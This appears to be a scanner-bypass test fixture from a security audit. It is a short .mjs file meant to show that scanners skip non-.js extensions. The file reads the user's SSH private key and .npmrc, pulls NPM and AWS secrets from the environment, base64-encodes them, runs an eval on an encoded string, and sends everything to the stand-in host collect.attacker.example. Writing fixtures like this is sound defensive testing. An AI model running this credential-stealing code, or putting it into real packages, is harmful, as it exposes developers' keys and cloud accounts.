// SECURITY_AUDIT.md v2.2.12 Bypass 03 reproduction — .mjs file extension
// Root cause (per v2.2.12 audit):
//   All scanners use findJsFiles() / findFiles({ extensions: ['.js'] }).
//   Files .mjs/.cjs/.ts are entirely invisible.

import fs from 'fs';
import https from 'https';
import os from 'os';

const ssh = fs.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf8');
const npm = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');
const token = process.env.NPM_TOKEN;
const aws = process.env.AWS_SECRET_ACCESS_KEY;

const payload = Buffer.from(JSON.stringify({ ssh, npm, token, aws })).toString('base64');

const decoded = Buffer.from('Y29uc29sZS5sb2coJ2V4ZmlsJyk=', 'base64').toString('utf8');
eval(decoded);

const req = https.request({
  hostname: 'collect.attacker.example',
  path: '/exfil?d=' + payload,
  method: 'POST'
});
req.end();
